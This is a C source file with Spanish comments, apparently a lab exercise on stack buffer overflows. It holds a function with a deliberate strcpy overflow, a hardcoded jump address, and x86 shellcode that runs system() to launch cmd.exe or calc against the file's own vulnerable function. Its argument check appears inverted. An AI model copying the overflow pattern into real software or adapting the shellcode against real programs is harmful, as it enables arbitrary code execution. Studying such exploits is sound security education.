/**
 * @file payload&tsunami.c
 * @author Miguel Soto (miguel@soto.es)
 * @brief Programa igual a payload.c con la funcion tsunami integrada.
 * Este programa tiene integrado tsunami.c, por lo que no hace uso de una función externa para ejecutar el programa.
 * 
 * @version 1.0
 * @date 2022-07-26
 * @copyright Copyright (c) 2022
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int tsunami (char *arg)
{
    printf("\n*** EJECUTANDO OLA ***\n\n");
    char buffer[16];
    
    strcpy (buffer, arg);

    return 0;
}

int main (int argc,char **argv)  //Declaramos argv para usarlo con el execv
{
    char evilbuffer[1024]="AAAABBBBCCCCDDDDEEEEFFFFHHHH"; //\x53\x93\x42\x7E";

    //Shellcode que ejecuta system("cmd.exe"), con la llamada a system harcodeada en 77C293C7 (\xC7\x93\xC2\x77)
    char shellcode1_cmd[]= "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";
    char shellcode2_calc[] = "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xFB\x63\xC6\x45\xFC\x61\xC6\x45\xFD\x6C\xC6\x45\xFE\x63\x8D\x45\xFB\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";

    // Ubicacion del jmp esp
    char offset3_call[] = "\x63\x46\x91\x7C";

    strcat(evilbuffer,offset3_call); //Concatenamos a evilbuffer el offset del jmp esp
    printf("evilbuffer + offset = %s", evilbuffer);
    
    if (argc < 2)
    {
        strcat(evilbuffer, shellcode2_calc);
    }
    else if (strcmp(argv[1], "cmd"))
    {
        strcat(evilbuffer, shellcode1_cmd);
    }

    printf ("\nCadena + offset + shellcode en formato printable\n\n");
    printf ("%s\n", evilbuffer);

    tsunami(evilbuffer);
}